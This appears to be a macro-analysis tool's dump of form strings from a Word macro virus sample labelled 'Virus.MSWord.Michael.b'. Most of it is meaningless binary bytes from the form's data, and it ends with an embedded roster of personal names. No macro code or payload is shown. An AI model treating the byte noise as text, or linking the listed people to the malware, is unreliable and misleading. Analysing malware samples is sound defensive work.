)F ,J,9c/Cq<S�Li�Qj�B[�-=l&3`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*Q0Br"-Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&!'I!/Y0DvPf�*3S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?4K�Wp�b{�f��p��s��q��f��b��U��Fh�>Z�);V</*:,%9) 3)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#C +K(8]4En>V�Kg�Ww�Tr�H\�.:l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*P6Eu5Et
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$G:IQl�Ld�%1W"0YLj�Jc�Vp�d��w���Ӏ��w��q��a��Ns�D_�-AhALo;=P5('1$!-"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
, $)%1#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)J#3Y.@kAU�Ng�Xx�^��b��Ys�:O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"G/@s=N�5GwBY�e��|�͆��i��k��_|�Mg�\x�x�Έ�؆�ڋ�ہ��y��i��Vz�Ce�5NxKi�b|�BU}2+/+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)&.)1U1;]*4Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"A!.P+@k9S�DY�Uv�_��f��h��f��So�4Fy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'O"-[(5g.?uQj�|�ɋ�ٗ��g��\y�Pl�Sn�q�ˊ�َ�ێ�ލ�ݎ�����}��g��Ov�;W�2Ffb��a��Sp�1##-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$%/K/@d)6Z!,M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(J%6^4JxEa�Um�f��k��f��i��g��^z�Kc�2@p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(T"3a?W�_�m��m��Z��Ph�Mj�l��~�ӈ�ێ�ᇪڈ�܇�܄�ڀ��e��Pz�>_�);`X�]}�Rw�@EY0#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0O(1R.:\#3R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+N-An?X�Vt�b}�f��`��d��_��a}�c��[r�6Iz$2a"/[#2c6N�Vq�a��c��Y��Qp�Z{�{�̅�׀��~��{�ҁ�ӄ�ג�����o��[��<_�*>d%6`d��In�Tu�1# /
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"!*Q#,K-7[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"? /T4KuJc�Zz�d��d��d��g��`��Zy�[w�Qf�:K(8i%6g':k9S�St�d��f��^��Uz�^����҇��{��x��z�ˈ�ҍ�ԏ��f��w��]��<f�(Bm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,V=W�Vz�A^�/$&0 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:(":+!2!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#M&2T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%D"1W4KpOk�Su�Wy�^~�c��a��`��^�Xz�AZ�8K~-Ap1Fw3Iy>W�X}�m��h��]��Xz�h��{�ց��m��m��x��͇��}��m��m��S��;d�)@mGc�';v7U�Dc�2.61 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;) =+!7%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 (J#1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#@"5W/HoAZHf�Ib�Ql�Sr�Ur�Pi�Sk�Wv�?Y�1F}2Iy2J|8S�Db�[��n��`��\��T��g��p��a�Xz�Sq�[y�c��g��d��i��Y��Kt�;c�*Co=T{7R�>[�W{�;AR. 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 C'4`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F&1Z'4T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#B!1Q,?c6Nm;Op6Gf->^,@k.Ft2G~7H{G]�Un�7S�,Cr/K}5N�Fh�`��r��_��V��U��a��Wv�?O�6L�5Q�Gc�Ss�@b�Ca�Ns�Ly�Gh�7`�)?n-=a5J�Gg�_��KXq3#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:( :'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.K%;[(;[$5P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(F!0T1Bk4Jm.?i>O�J\�Mc�K`�,>k*Eu0K�Ba�j��{��X~�U~�S�a��=Y�6Dx<R~.DdHZs\q�9Q�.Jx8Z�?c�>b�4V�%;f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&<2CLi�i��Rk�5#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 M7Hk *R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:3?mEL]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&{��n��0<j+:Z6Lt&;g0BvQl�r�ċ��_��N{�V~�Ot�>R_o�R_f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cmjXp�$9n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1\,Jy4T�+K}$;d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!+:gKm�_��<Z�3#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"P3@h!.V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;:7���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Q ,XD]�Yu�m��Sv�?^�/L|/Ju!,LTW\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.V+Ix.Jy&@n$8_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5KvSy�Ps�!7u7,,6"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!L%1X%2X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
740BLJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<"2W:N}I^�Sp�Hg�6Mv':c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*K!7^.Mw0Mx&>e$7Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;KeMp�Oo�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+g9373"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M$+R%/U"+I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(H8IwJc�Nf�Xu�Ni�A_�4Fo#6V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%5'2G6FY+?^)=e5U}:W�3Nw&>e$9b

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 *d��Lg�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,h,&&-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=,!<(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*;#/>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$=6EoTn�]x�`x�c�\y�Zs�I\�=Qu#+G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-!+<+6L.=X8Gf;Rw@[�&7[#5Y$;c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(2GYw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/!'J'0L

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)'/K5AeK\�Ys�p��j��v��x��l��r��d}�a�Pb�<In/9T"&9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#1(2F<He=Mk2A^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)E!1Y#9b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@Xw0Jq$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.##3""2'(7-.D/5MESw[o�i��n��y��}��z�Ɂ�΀��x��x�ŀ�Â�Ƀ�ȋ��v��f�Sb�KWgKTf>J_27L"-J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#< 8_%8g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&+2>#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)"$:$'>:@WFKfLZ~eu�j~�v��}�À�ł�͋��{�Є�҄��}�ǂ�̉�Տ�ԋ�ל�ٙ�֏�͇��u��Ug>Nh,;Z(9b$:i"8h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#@ )I(2V8HkGY�Qd�]p�o��w��{�Ń���̓��z��|��s��t��k���΃��w���Ջ�Ӄ��x��l��Uu�>Q}>\�0N�'?t":g#:`	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&K!0Y(:b*<i4Kx=V�Tk�c��m��o��u��s��z��w��t��w��p��i��n��s��r��v��w��n��d��^��Sx�Ef�=a�.P�(D|#>l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-U%6a!2]+Cm9R�Kc�Vt�b��b��m��i��j��q��o��q��q��p��h��b��l��d��b��_��V}�Oy�Hu�?i�4X�.P�'Ew$<g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/X#5a'<p5O�G`�Wp�Wz�`��b��`��k��m��o��u��w��o��k��h��f��f��h��X��T{�Ow�Px�Cn�6Y�.K}*Gy(=b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$K!1Z'>i+Br<T�La�Rs�^�_��c��f��d��g��s��{��~��z�Ƀ��{��~��r��m��b��Z��Ry�Lu�En�9Z�*Dv*Cm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%G#8^'<j)@r8Q�Hb�Tr�[z�[|�`��d��g��f��t��s��x��x��{��}��z��m��s��e��Z��Pv�Gm�Fm�8[�#8`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(K /]+=m.Cu<U�Mg�Wn�a}�d��c��c��c��g��l��v��t��t��}��w�̀��}��o��b��Y~�Lt�Eh�=`�0Iw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&L!3Z':e.Ex7L�Kf�Qm�Yz�\~�_��Y|�\{�a��e��p��r��t��y��q��o��h��g��^��Qz�Ck�4U�1My
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<#4Z$6e+Co:U�C[�Hb�Hf�Uv�V{�Pt�Sw�X��Z~�c��i��o��n��c��e��b��W~�Ot�Hj�3Q�(Al
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0Y'<j0Ex<R�>\�Ge�Ff�Hh�Mp�Ms�Hp�Nt�X��^��`��[��V�U��Ot�Kr�Fm�<Z�#7`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-S$9e2Gz4J�:Q�;U�@]�Dd�@c�Jn�Ck�Jn�Mr�T}�X~�Qy�Mp�Io�Fg�Ad�<[�+@k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,W(9h1Fz7P�6N�<Y�>X�?]�Db�Cg�Fl�Kr�Rv�Pv�Oo�Hl�Dc�A^�:[�-Ds
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'M&7e2Fr3H{4O�:V�8U�Aa�Dg�Ab�Gl�Np�Kp�Gj�Di�>]�8S�/Gu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*I$4Z-Cj.Er4M|4O|8V�:X�5P|>Z�Ih�Ef�Mj�Df�<Z�/Dr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&@*9Z.Df+Ab):[&2P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%6,7N=Pg<[{.Ce
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



		
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

	
	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	

	


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H3!?+#	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3-'64**'"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 =-,<3.>82<1+ 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'#()#$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F<:G<7?7010% 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
('#)/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)*01
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
88//-)5-#3&*.##%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<#9; ;?003%,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)  8#-'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A>-D2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GE6?;*-%$&)&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Close
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Character2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(In No Particular Order Using 
 Rnd (110) and Randomize )

Franco Rayela
Roger Macalino
Byron James C. Ngan
Onel de Guzman
Serafin Santos
Conrad Pena
Jerome Sison
Alde Aceveda
Philip Mora
Richard Canuto
Leonides "Darren" Mendoza
Emetrio "Jing" Austria
Irving Ilagan
Christian Ramirez
Edwin & Erwin Quita
Joana Alonso
